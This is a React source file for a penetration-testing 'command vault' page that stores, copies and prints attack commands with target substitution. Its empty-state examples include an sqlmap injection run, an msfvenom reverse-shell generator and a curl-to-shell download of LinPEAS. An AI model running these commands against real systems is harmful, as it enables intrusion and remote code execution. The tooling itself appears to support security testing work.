import React, { useState, useEffect } from 'react';
import { FileCode, Search, Plus, Trash2, Edit, Save, X, Copy, Terminal, Check, Loader2, Code2, ChevronLeft, Target, Printer } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';

function cn(...inputs: (string | boolean | undefined | null)[]) {
  return twMerge(clsx(inputs));
}

const CATEGORIES = ['recon', 'exploitation', 'post-exploitation', 'password', 'network', 'web', 'active-directory', 'shells', 'reporting', 'uncategorized'];

function substituteTarget(command: string, target: string): string {
  if (!target) return command;
  return command
    .replace(/\{\{target\}\}/gi, target)
    .replace(/\{\{TARGET\}\}/gi, target)
    .replace(/TARGET_IP/g, target)
    .replace(/TARGET_URL/g, target);
}

function renderCommand(text: string) {
  return (
    <div className="relative group my-3">
      <pre className="bg-black text-primary p-4 rounded border border-primary/20 overflow-x-auto font-mono text-xs shadow-inner whitespace-pre-wrap break-all">
        <code>{text}</code>
      </pre>
    </div>
  );
}

function CommandDetail({
  cmd,
  target,
  onBack,
  onEdit,
  onDelete,
}: {
  cmd: any;
  target: string;
  onBack: () => void;
  onEdit: (cmd: any) => void;
  onDelete: (id: string) => void;
}) {
  const [copied, setCopied] = useState(false);
  const displayCommand = target ? substituteTarget(cmd.command, target) : cmd.command;
  const hasTarget = cmd.command.includes('{{target}}') || cmd.command.includes('{{TARGET}}') || cmd.command.includes('TARGET_IP') || cmd.command.includes('TARGET_URL');

  const handleCopy = () => {
    navigator.clipboard.writeText(displayCommand);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    fetch(`/api/commands/${cmd.id}/use`, { method: 'POST' }).catch(() => {});
  };

  const handleDelete = () => {
    if (!confirm(`Delete "${cmd.title}"?`)) return;
    onDelete(cmd.id);
  };

  return (
    <div className="flex-1 overflow-hidden flex flex-col font-mono">
      <div className="p-4 md:p-6 border-b border-border bg-card/20 shrink-0">
        <button onClick={onBack} className="mb-3 text-xs text-muted-foreground hover:text-foreground flex items-center gap-1 transition-colors">
          <ChevronLeft size={14} /> Back to commands
        </button>
        <div className="flex flex-col md:flex-row md:justify-between md:items-start gap-3">
          <div>
            <div className="flex items-center gap-2 md:gap-3 mb-2 flex-wrap">
              <Terminal className="text-primary shrink-0" size={20} />
              <h1 className="text-xl md:text-2xl font-bold">{cmd.title}</h1>
              <span className="px-2 py-0.5 text-[10px] font-bold uppercase bg-primary/10 text-primary border border-primary/50 rounded capitalize">{cmd.category}</span>
              {hasTarget && target && (
                <span className="px-2 py-0.5 text-[10px] bg-primary/10 border border-primary/30 rounded text-primary">→ {target}</span>
              )}
              {hasTarget && !target && (
                <span className="text-[10px] text-yellow-400/70 flex items-center gap-1 border border-yellow-400/20 rounded px-2 py-0.5"><Target size={9} /> Set a target above to auto-fill</span>
              )}
            </div>
            {cmd.description && (
              <p className="text-muted-foreground max-w-2xl text-xs md:text-sm leading-relaxed">{cmd.description}</p>
            )}
            {cmd.useCount > 0 && (
              <p className="text-[10px] text-muted-foreground/40 mt-1">Used {cmd.useCount} time{cmd.useCount !== 1 ? 's' : ''}{cmd.lastUsed ? ` · Last: ${new Date(cmd.lastUsed).toLocaleDateString()}` : ''}</p>
            )}
          </div>
          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={() => onEdit(cmd)}
              className="h-8 px-3 text-xs border border-border text-muted-foreground hover:text-foreground hover:border-primary/40 rounded flex items-center gap-1.5 transition-colors"
            >
              <Edit size={12} /> Edit
            </button>
            <button
              onClick={handleDelete}
              className="h-8 px-3 text-xs border border-destructive/30 text-destructive/70 hover:bg-destructive/10 hover:text-destructive rounded flex items-center gap-1.5 transition-colors"
            >
              <Trash2 size={12} /> Delete
            </button>
          </div>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-4 md:p-8 bg-background/50">
        <div className="max-w-4xl mx-auto">
          <div className="mb-4 flex items-center justify-between">
            <div className="flex items-center gap-2 font-semibold pb-2 border-b border-border text-xs md:text-sm w-full">
              <Code2 className="text-primary" size={16} /> Command
            </div>
          </div>

          <div className="relative group">
            <pre className={cn(
              "p-4 rounded border text-xs md:text-sm font-mono overflow-x-auto whitespace-pre-wrap break-all shadow-inner leading-relaxed",
              target && hasTarget ? "bg-primary/5 border-primary/30 text-primary" : "bg-black text-primary border-primary/20"
            )}>
              <code>{displayCommand}</code>
            </pre>
            <button
              onClick={handleCopy}
              className={cn(
                "absolute top-3 right-3 flex items-center gap-1.5 px-3 py-1.5 rounded border text-[10px] font-bold transition-all",
                copied
                  ? "border-primary bg-primary/20 text-primary"
                  : "border-border bg-black/60 text-muted-foreground hover:border-primary/50 hover:text-primary hover:bg-primary/10 opacity-0 group-hover:opacity-100"
              )}
            >
              {copied ? <><Check size={10} /> Copied!</> : <><Copy size={10} /> Copy</>}
            </button>
          </div>

          <button
            onClick={handleCopy}
            className={cn(
              "mt-4 w-full py-2.5 rounded border text-xs font-bold flex items-center justify-center gap-2 transition-all",
              copied
                ? "border-primary bg-primary/20 text-primary"
                : "border-border text-muted-foreground hover:border-primary/50 hover:text-primary hover:bg-primary/10"
            )}
          >
            {copied ? <><Check size={12} /> Copied to clipboard!</> : <><Copy size={12} /> Copy Command</>}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function CommandsPage() {
  const [commands, setCommands] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilter, setCategoryFilter] = useState<string | null>(null);
  const [isFormOpen, setIsFormOpen] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [formData, setFormData] = useState({ title: '', command: '', description: '', category: '' });
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isSaving, setIsSaving] = useState(false);
  const [saveError, setSaveError] = useState<string | null>(null);
  const [showSidebar, setShowSidebar] = useState(false);
  const [target, setTarget] = useState('');
  const [showCheatsheet, setShowCheatsheet] = useState(false);
  const [selectedId, setSelectedId] = useState<string | null>(null);

  const fetchCommands = async () => {
    const res = await fetch('/api/commands');
    const data = await res.json();
    setCommands(Array.isArray(data) ? data : []);
  };

  useEffect(() => { fetchCommands().finally(() => setIsLoading(false)); }, []);

  const filteredCommands = commands.filter(c => {
    const matchesSearch = !searchQuery || c.title.toLowerCase().includes(searchQuery.toLowerCase()) || c.command.toLowerCase().includes(searchQuery.toLowerCase()) || (c.description && c.description.toLowerCase().includes(searchQuery.toLowerCase()));
    const matchesCategory = !categoryFilter || c.category === categoryFilter;
    return matchesSearch && matchesCategory;
  });

  const groupedForCheatsheet = CATEGORIES.reduce((acc, cat) => {
    const cmds = commands.filter(c => c.category === cat);
    if (cmds.length) acc[cat] = cmds;
    return acc;
  }, {} as Record<string, any[]>);

  const resetForm = () => { setFormData({ title: '', command: '', description: '', category: '' }); setEditingId(null); setSaveError(null); };

  const openEditForm = (cmd: any) => {
    setFormData({ title: cmd.title, command: cmd.command, description: cmd.description || '', category: cmd.category });
    setEditingId(cmd.id);
    setIsFormOpen(true);
  };

  const handleSave = async () => {
    setIsSaving(true);
    const payload = { title: formData.title, command: formData.command, description: formData.description || undefined, category: formData.category || 'uncategorized' };
    try {
      const res = editingId
        ? await fetch(`/api/commands/${editingId}`, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        : await fetch('/api/commands', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      if (!res.ok) { const d = await res.json().catch(() => ({})); throw new Error(d.error ?? `HTTP ${res.status}`); }
      setSaveError(null);
      setIsFormOpen(false); resetForm(); await fetchCommands();
    } catch (err: any) {
      setSaveError(err.message ?? 'Failed to save command. Please try again.');
    }
    setIsSaving(false);
  };

  const handleDelete = async (id: string) => {
    await fetch(`/api/commands/${id}`, { method: 'DELETE' });
    setSelectedId(null);
    await fetchCommands();
  };

  const handleCardCopy = (id: string, text: string, e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(target ? substituteTarget(text, target) : text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
    fetch(`/api/commands/${id}/use`, { method: 'POST' }).catch(() => {});
    setCommands(prev => prev.map(c => c.id === id ? { ...c, useCount: (c.useCount ?? 0) + 1, lastUsed: new Date().toISOString() } : c));
  };

  const printCheatsheet = () => {
    const win = window.open('', '_blank');
    if (!win) return;
    const html = `<!DOCTYPE html><html><head><title>CyberSentinel Cheatsheet</title><style>body{font-family:monospace;background:#000;color:#00ff66;padding:20px}h1{color:#00ff66;border-bottom:1px solid #00ff66;padding-bottom:8px}h2{color:#00ff66;margin-top:24px;text-transform:uppercase;font-size:12px;letter-spacing:2px}pre{background:#111;border:1px solid #00ff6633;padding:12px;border-radius:4px;overflow-x:auto;font-size:12px;color:#00ff66}.desc{color:#888;font-size:11px;margin:4px 0 12px}.cmd-title{font-weight:bold;font-size:13px}</style></head><body><h1>⊛ CYBER SENTINEL — Command Cheatsheet</h1><p style="color:#888;font-size:11px">Generated: ${new Date().toLocaleString()}${target ? ` · Target: ${target}` : ''}</p>${Object.entries(groupedForCheatsheet).map(([cat, cmds]) => `<h2>[ ${cat} ]</h2>${cmds.map(c => `<div class="cmd-title">${c.title}</div>${c.description ? `<div class="desc">${c.description}</div>` : ''}<pre>${target ? substituteTarget(c.command, target) : c.command}</pre>`).join('')}`).join('')}</body></html>`;
    win.document.write(html);
    win.document.close();
    win.print();
  };

  // ── Detail view ──
  const selectedCmd = selectedId ? commands.find(c => c.id === selectedId) : null;
  if (selectedCmd) {
    return (
      <div className="flex h-full overflow-hidden font-mono">
        {/* Sidebar stays visible */}
        <div className="hidden md:flex border-r border-border bg-card/30 w-52 flex-col shrink-0">
          <div className="p-4 border-b border-border">
            <h2 className="font-semibold flex items-center gap-2 text-sm"><Code2 size={16} className="text-primary" /> Categories</h2>
          </div>
          <div className="flex-1 overflow-y-auto p-2 space-y-0.5">
            <button onClick={() => setCategoryFilter(null)} className={cn("w-full text-left px-3 py-2 rounded text-xs transition-colors", !categoryFilter ? "bg-primary/10 text-primary" : "text-muted-foreground hover:bg-secondary hover:text-foreground")}>
              All <span className="ml-1 text-[10px] opacity-50">({commands.length})</span>
            </button>
            {CATEGORIES.filter(c => commands.some(cmd => cmd.category === c)).map(cat => (
              <button key={cat} onClick={() => setCategoryFilter(cat)} className={cn("w-full text-left px-3 py-2 rounded text-xs transition-colors capitalize", categoryFilter === cat ? "bg-primary/10 text-primary" : "text-muted-foreground hover:bg-secondary hover:text-foreground")}>
                {cat} <span className="ml-1 text-[10px] opacity-40">({commands.filter(c => c.category === cat).length})</span>
              </button>
            ))}
          </div>
          {/* Target input also in detail view */}
          <div className="p-3 border-t border-border space-y-2">
            <div className="flex items-center gap-1.5">
              <Target size={11} className="text-primary shrink-0" />
              <input value={target} onChange={e => setTarget(e.target.value)} placeholder="Target IP/URL" className="flex-1 px-2 py-1 bg-black/40 border border-primary/20 rounded text-[10px] focus:outline-none focus:border-primary font-mono placeholder:text-muted-foreground/30" />
              {target && <button onClick={() => setTarget('')} className="text-muted-foreground hover:text-foreground"><X size={10} /></button>}
            </div>
          </div>
        </div>
        <CommandDetail
          cmd={selectedCmd}
          target={target}
          onBack={() => setSelectedId(null)}
          onEdit={(cmd) => { openEditForm(cmd); setSelectedId(null); setIsFormOpen(true); }}
          onDelete={handleDelete}
        />
      </div>
    );
  }

  // ── Cheatsheet view ──
  if (showCheatsheet) {
    return (
      <div className="flex-1 overflow-hidden flex flex-col font-mono">
        <div className="p-4 border-b border-border bg-card/20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <button onClick={() => setShowCheatsheet(false)} className="text-xs text-muted-foreground hover:text-primary flex items-center gap-1 transition-colors"><ChevronLeft size={14} /> Back</button>
            <h2 className="font-bold text-sm flex items-center gap-2"><Printer size={14} className="text-primary" /> Cheatsheet Mode</h2>
          </div>
          <button onClick={printCheatsheet} className="px-3 py-1.5 text-xs border border-primary/50 text-primary hover:bg-primary/20 rounded flex items-center gap-1.5 transition-colors"><Printer size={12} /> Print / Save PDF</button>
        </div>
        <div className="flex-1 overflow-y-auto p-6">
          {Object.entries(groupedForCheatsheet).map(([cat, cmds]) => (
            <div key={cat} className="mb-8">
              <h3 className="text-[10px] uppercase tracking-widest text-primary/60 border-b border-primary/20 pb-1 mb-3">[ {cat} ]</h3>
              <div className="space-y-3">
                {cmds.map(cmd => (
                  <div key={cmd.id}>
                    <div className="font-bold text-xs mb-0.5">{cmd.title}</div>
                    {cmd.description && <div className="text-[10px] text-muted-foreground mb-1">{cmd.description}</div>}
                    <pre className="bg-black/60 text-primary p-2.5 rounded border border-primary/10 text-xs overflow-x-auto font-mono">{target ? substituteTarget(cmd.command, target) : cmd.command}</pre>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  }

  // ── Grid view ──
  return (
    <div className="flex h-full overflow-hidden font-mono">
      {showSidebar && <div className="fixed inset-0 bg-black/60 z-20 md:hidden" onClick={() => setShowSidebar(false)} />}

      {/* Category sidebar */}
      <div className={cn("border-r border-border bg-card/30 flex flex-col shrink-0 z-30 transition-transform duration-300", "md:w-52 md:static md:translate-x-0", showSidebar ? "fixed inset-y-0 left-0 w-56 translate-x-0" : "hidden md:flex")}>
        <div className="p-3 md:p-4 border-b border-border">
          <h2 className="font-semibold flex items-center gap-2 text-xs md:text-sm"><Code2 size={16} className="text-primary" /> Categories</h2>
        </div>
        <div className="flex-1 overflow-y-auto p-2 space-y-0.5">
          <button onClick={() => { setCategoryFilter(null); setShowSidebar(false); }} className={cn("w-full text-left px-3 py-2 rounded text-xs transition-colors", !categoryFilter ? "bg-primary/10 text-primary" : "text-muted-foreground hover:bg-secondary hover:text-foreground")}>
            All <span className="ml-1 text-[10px] opacity-50">({commands.length})</span>
          </button>
          {CATEGORIES.filter(c => commands.some(cmd => cmd.category === c)).map(cat => (
            <button key={cat} onClick={() => { setCategoryFilter(cat); setShowSidebar(false); }} className={cn("w-full text-left px-3 py-2 rounded text-xs transition-colors capitalize", categoryFilter === cat ? "bg-primary/10 text-primary" : "text-muted-foreground hover:bg-secondary hover:text-foreground")}>
              {cat} <span className="ml-1 text-[10px] opacity-40">({commands.filter(c => c.category === cat).length})</span>
            </button>
          ))}
        </div>
        <div className="p-3 border-t border-border">
          <button onClick={() => setShowCheatsheet(true)} className="w-full px-3 py-2 text-xs border border-border text-muted-foreground hover:text-primary hover:border-primary/40 rounded flex items-center gap-1.5 transition-colors">
            <Printer size={11} /> Cheatsheet Mode
          </button>
        </div>
      </div>

      <div className="flex-1 flex flex-col overflow-hidden min-w-0">
        {/* Top bar */}
        <div className="p-3 md:p-4 border-b border-border bg-card/20 space-y-2.5">
          <div className="flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 min-w-0 flex-1">
              <button onClick={() => setShowSidebar(true)} className="md:hidden p-1.5 border border-border rounded text-muted-foreground hover:text-primary hover:border-primary/50 transition-colors shrink-0"><Code2 size={14} /></button>
              <div className="relative flex-1 md:flex-none md:w-56">
                <Search className="absolute left-2.5 top-2 h-3.5 w-3.5 text-muted-foreground" />
                <input placeholder="Search commands..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full pl-8 pr-3 py-1.5 bg-black/50 border border-border rounded text-xs focus:outline-none focus:border-primary" />
              </div>
            </div>
            <button onClick={() => { resetForm(); setIsFormOpen(true); }} className="h-8 px-3 text-xs border border-primary/50 text-primary hover:bg-primary/20 rounded flex items-center gap-1 transition-colors shrink-0"><Plus size={13} /> New</button>
          </div>

          {/* Target variable input */}
          <div className="flex items-center gap-2">
            <Target size={12} className="text-primary shrink-0" />
            <span className="text-[10px] text-muted-foreground shrink-0">Target:</span>
            <input
              value={target}
              onChange={e => setTarget(e.target.value)}
              placeholder="Set target IP/URL — auto-fills {{target}} in all commands"
              className="flex-1 px-2.5 py-1 bg-black/40 border border-primary/20 rounded text-[11px] focus:outline-none focus:border-primary font-mono placeholder:text-muted-foreground/30"
            />
            {target && <button onClick={() => setTarget('')} className="text-muted-foreground hover:text-foreground"><X size={11} /></button>}
          </div>
          {target && <div className="text-[10px] text-primary/60 pl-5">→ Commands will auto-substitute <code className="bg-black/30 px-1 rounded">{'{{target}}'}</code> with <span className="text-primary font-mono">{target}</span></div>}
        </div>

        {/* Add/Edit form */}
        {isFormOpen && (
          <div className="p-3 md:p-4 border-b border-border bg-black/30 space-y-2.5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
              <input placeholder="Title" value={formData.title} onChange={e => setFormData({ ...formData, title: e.target.value })} className="px-3 py-2 text-xs bg-secondary/50 border border-border rounded focus:outline-none focus:border-primary" />
              <select value={formData.category} onChange={e => setFormData({ ...formData, category: e.target.value })} className="px-3 py-2 text-xs bg-secondary/50 border border-border rounded focus:outline-none focus:border-primary">
                <option value="">Category</option>
                {CATEGORIES.map(c => <option key={c} value={c}>{c}</option>)}
              </select>
            </div>
            <textarea placeholder="Command — use {{target}} for auto-substitution" value={formData.command} onChange={e => setFormData({ ...formData, command: e.target.value })} className="w-full px-3 py-2 text-xs bg-black/50 border border-border rounded focus:outline-none focus:border-primary font-mono h-20 resize-none" />
            <input placeholder="Description (optional)" value={formData.description} onChange={e => setFormData({ ...formData, description: e.target.value })} className="w-full px-3 py-2 text-xs bg-secondary/50 border border-border rounded focus:outline-none focus:border-primary" />
            {saveError && <p className="text-xs text-destructive text-right">{saveError}</p>}
            <div className="flex gap-2 justify-end">
              <button onClick={() => { setIsFormOpen(false); resetForm(); }} className="px-3 py-1.5 text-xs rounded hover:bg-secondary transition-colors flex items-center gap-1"><X size={12} /> Cancel</button>
              <button onClick={handleSave} disabled={isSaving || !formData.title || !formData.command} className="px-3 py-1.5 text-xs font-bold bg-primary text-black rounded hover:bg-primary/80 disabled:opacity-30 flex items-center gap-1 transition-colors">
                {isSaving ? <Loader2 size={12} className="animate-spin" /> : <Save size={12} />} Save
              </button>
            </div>
          </div>
        )}

        {/* Card grid */}
        <div className="flex-1 overflow-y-auto p-3 md:p-5">
          {isLoading ? (
            <div className="flex justify-center items-center py-16 text-primary text-sm">
              <Loader2 className="animate-spin mr-2" size={18} /> Loading commands...
            </div>
          ) : filteredCommands.length === 0 ? (
            commands.length === 0 ? (
              <div className="max-w-2xl mx-auto py-8 space-y-5">
                <div className="text-center space-y-2">
                  <FileCode size={32} className="opacity-20 mx-auto" />
                  <p className="text-sm font-bold text-foreground">No commands saved yet</p>
                  <p className="text-xs text-muted-foreground">Your personal command vault — save any terminal command and access it instantly with one click.</p>
                  <button onClick={() => { resetForm(); setIsFormOpen(true); }} className="mt-2 px-4 py-2 text-xs border border-primary/50 text-primary hover:bg-primary/20 rounded flex items-center gap-1 transition-colors mx-auto"><Plus size={12} /> Add First Command</button>
                </div>
                <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 space-y-3">
                  <div className="text-[10px] text-primary tracking-widest uppercase font-bold flex items-center gap-1.5"><Target size={11} /> Tip: Use {'{{'}<span className="text-primary">target</span>{'}}'}  for auto-substitution</div>
                  <p className="text-xs text-muted-foreground leading-relaxed">Add <code className="bg-black/30 px-1 rounded text-primary">{'{{target}}'}</code> anywhere in a command. Then set a target IP/URL at the top of the page — all commands auto-fill with your target. Great for repeating the same scan against different hosts.</p>
                </div>
                <div className="space-y-2">
                  <div className="text-[10px] text-muted-foreground tracking-widest uppercase">Example commands to get started:</div>
                  {[
                    { title: 'Nmap Port Scan', category: 'recon', command: 'nmap -sC -sV -oN scan.txt {{target}}', description: 'Full port scan with service detection and default scripts. Saves output to scan.txt.' },
                    { title: 'Gobuster Directory Brute', category: 'web', command: 'gobuster dir -u http://{{target}} -w /usr/share/wordlists/dirb/common.txt -o dirs.txt', description: 'Brute force web directories using a common wordlist.' },
                    { title: 'SQLmap Auto-Exploit', category: 'web', command: "sqlmap -u 'http://{{target}}/login?id=1' --dbs --batch", description: 'Automatically detect and exploit SQL injection, dumping database names.' },
                    { title: 'MSFvenom Reverse Shell', category: 'exploitation', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={{target}} LPORT=4444 -f elf -o shell.elf', description: 'Generate a Linux reverse shell ELF binary connecting back to your IP.' },
                    { title: 'LinPEAS Privesc', category: 'post-exploitation', command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', description: 'Download and run LinPEAS privilege escalation enumeration script.' },
                  ].map(ex => (
                    <div key={ex.title} className="bg-card/50 border border-border rounded-lg p-3 flex items-start justify-between gap-3">
                      <div className="min-w-0 flex-1 space-y-1">
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-bold text-foreground">{ex.title}</span>
                          <span className="text-[9px] px-1.5 py-0.5 border border-border bg-secondary text-muted-foreground rounded uppercase font-bold">{ex.category}</span>
                        </div>
                        <pre className="text-[10px] text-primary font-mono bg-black/40 px-2 py-1.5 rounded border border-primary/10 overflow-x-auto">{ex.command}</pre>
                        <p className="text-[10px] text-muted-foreground">{ex.description}</p>
                      </div>
                      <button onClick={() => { setFormData({ title: ex.title, category: ex.category, command: ex.command, description: ex.description }); setIsFormOpen(true); }}
                        className="shrink-0 text-[10px] text-primary/60 hover:text-primary border border-primary/20 hover:border-primary/50 px-2 py-1 rounded transition-colors">
                        import
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center py-16 text-muted-foreground text-xs gap-2">
                <Search size={24} className="opacity-20" />
                <p>No commands match your search.</p>
              </div>
            )
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredCommands.map(cmd => {
                const displayCommand = target ? substituteTarget(cmd.command, target) : cmd.command;
                const hasTarget = cmd.command.includes('{{target}}') || cmd.command.includes('{{TARGET}}') || cmd.command.includes('TARGET_IP') || cmd.command.includes('TARGET_URL');

                return (
                  <div
                    key={cmd.id}
                    onClick={() => setSelectedId(cmd.id)}
                    className="bg-card border border-border hover:border-primary/50 transition-all cursor-pointer group flex flex-col rounded-lg overflow-hidden"
                  >
                    {/* Card header */}
                    <div className="p-4 pb-3 flex items-start justify-between gap-2">
                      <div className="flex items-start gap-2 min-w-0">
                        <Terminal size={15} className="text-muted-foreground group-hover:text-primary transition-colors shrink-0 mt-0.5" />
                        <div className="min-w-0">
                          <h3 className="font-bold text-sm group-hover:text-primary transition-colors leading-tight truncate">{cmd.title}</h3>
                          <div className="flex items-center gap-1.5 mt-1 flex-wrap">
                            <span className="text-[10px] px-1.5 py-0.5 border border-border bg-secondary text-muted-foreground rounded uppercase font-bold capitalize">{cmd.category}</span>
                            {hasTarget && target && <span className="text-[10px] px-1.5 py-0.5 bg-primary/10 border border-primary/30 rounded text-primary">→ {target}</span>}
                            {hasTarget && !target && <span className="text-[9px] text-muted-foreground/40 flex items-center gap-0.5"><Target size={7} /> needs target</span>}
                            {cmd.useCount > 0 && <span className="text-[9px] text-muted-foreground/30 font-mono" title={cmd.lastUsed ? `Last used: ${new Date(cmd.lastUsed).toLocaleDateString()}` : ''}>×{cmd.useCount}</span>}
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Command preview */}
                    <div className={cn("mx-3 mb-3 rounded border text-[11px] font-mono overflow-hidden", target && hasTarget ? "bg-primary/5 border-primary/20" : "bg-black/60 border-primary/10")}>
                      <pre className="text-primary px-3 py-2.5 truncate">
                        {displayCommand}
                      </pre>
                    </div>

                    {/* Description */}
                    {cmd.description && (
                      <p className="text-[11px] text-muted-foreground px-4 pb-3 leading-relaxed line-clamp-2">{cmd.description}</p>
                    )}

                    {/* Bottom bar */}
                    <div className="mt-auto border-t border-border/50 px-4 py-2.5 flex items-center justify-between">
                      <span className="text-[9px] text-primary/40 flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-all">
                        <Code2 size={8} /> Click to view →
                      </span>
                      <button
                        onClick={e => handleCardCopy(cmd.id, cmd.command, e)}
                        className={cn(
                          "flex items-center gap-1.5 px-3 py-1 rounded text-[10px] font-bold border transition-all",
                          copiedId === cmd.id
                            ? "border-primary bg-primary/20 text-primary"
                            : "border-border text-muted-foreground hover:border-primary/50 hover:text-primary hover:bg-primary/10"
                        )}
                      >
                        {copiedId === cmd.id ? <><Check size={10} /> Copied!</> : <><Copy size={10} /> Copy</>}
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
